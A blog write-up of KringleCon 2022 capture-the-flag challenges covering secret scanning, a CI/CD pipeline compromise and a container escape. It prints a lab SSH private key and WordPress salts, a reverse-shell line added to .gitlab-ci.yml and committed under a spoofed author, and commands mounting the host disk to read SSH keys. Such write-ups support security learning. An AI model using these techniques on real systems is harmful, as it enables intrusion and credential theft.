---
layout: kringlecon2022
title: "Elfen Ring"
author: "Andrew Cherney"
date: 2023-01-15 19:52:13
tags: 
- kringlecon 
- ci/cd 
- sandbox-escape
---
## Clone with a Difference
***
___
Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials?

***

easy challenge
install trufflehog
scan https://haugfactory.com/orcadmin/aws_scripts

`git clone https://github.com/trufflesecurity/trufflehog.git`

`cd trufflehog; go install`

`trufflehog git https://haugfactory.com/orcadmin/aws_scripts`

___





## Jolly CI/CD
***
___
find misconfigurations and vulnerabilites in the CI/CD pipeline

***

[CI/CD Attack Steps](https://www.paloaltonetworks.com/blog/2021/10/anatomy-ci-cd-pipeline-attack/)

we start off dropped into a container and needing to make an escape of some sorts. Looking at the output of `df -HaT` we can see `/dev/root` is mounted at multiple locations. Dead end

talking to Tinsel Upatree we get a link to a repo `http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`

start by cloning that git
`git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`

looks like a wordpress shop backend
database seems to be using some defaults

DB_NAME: wordpress
DB_USER: example username
DB_PASS: example password
DB_HOST: mysql

WORDPRESS_ENV: `http://wordpress.flag.net.internal:8080`

check `git log` and see whoops, update gitlab-ci.yml, and update wp-config

`'WORDPRESS_AUTH_KEY':'828baa18284a5a7bfd11a00b872370c8ed403f3b'
'WORDPRESS_SECURE_AUTH_KEY':'642534c3a9a10dde9d2837e1a3c940af3dca0893'
'WORDPRESS_LOGGED_IN_KEY':'2752181bd2e986d32448bd55beb4ac6c49a709f4'
'WORDPRESS_NONCE_KEY':'5bf27de94d31f288ae971b76b2281329c2bbdfee'
'WORDPRESS_AUTH_SALT':'fdc0ba7e8bf25d7197f4367f8fb81eb9ee79f5e8'
'WORDPRESS_SECURE_AUTH_SALT';'760c60029c3867ea1f27011896c3dc5316d895cd'
'WORDPRESS_LOGGED_IN_SALT';'aa193eca87378d51d6e574fceb5120c92cd1349c'
'WORDPRESS_NONCE_SALT':'debed84d451729b0c0b316661ff8caf40875514a'`

private key in whoops

`-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----`

authorized keys too

`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com`

re-clone the repo with this new ssh key after adding it to .ssh (turns out I can use something i looked up later in the process to properly reclone the repo with the ssh key)

`nano .ssh/id_rsa`
`GIT_SSH_COMMAND="ssh -i /home/samways/.ssh/id_rsa" git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`

with the private ssh key likely we can make changes to the repo itself. With this info I can upload scripts to be run through the `.gitlab-ci.yml` file in the git repo. 

add this reverse shell to the script.
`    - sh -i >& /dev/tcp/172.18.0.99/7222 0>&1`

here i among used and pretended to be sporx, among us

`git add .gitlab-ci.yml`
`git config --global user.email "sporx@kringlecon.com"`
`git config --global user.name "sporx"`
`git commit -m 'reverse shell'`

Now I need to push this commit to the main branch. If I try to do that now it will ask for a password and username, the first of which I do not have. I found reference to GIT_SSH_COMMAND, which can be used to push the commit to main with my ssh key without a password or username. 

`GIT_SSH_COMMAND="ssh -i /home/samways/.ssh/id_rsa" git push origin main`


if we remember the gitlab yml file we changed there was an ssh as root for the wordpress flag net where the ssh key is in a gitlab-runner machine, which is the one we just got a shell into. lets try to run that. 

`ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal`

oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT

___




## Prison Escape
***
___
escape the container

***

using `ls /dev` we can see that we are in a privileged container and in this list there might be the host disk. vda is a strong contender for a host disk so I mount the disk in a new directory and look inside.
`mkdir /tmp/freedom`
`sudo mount /dev/vda /tmp/freedom`
then the challenge is to find the keys which probably means ssh keys
`cat /tmp/freedom/home/jailer/.ssh/*`
then we grab that key and escape

___












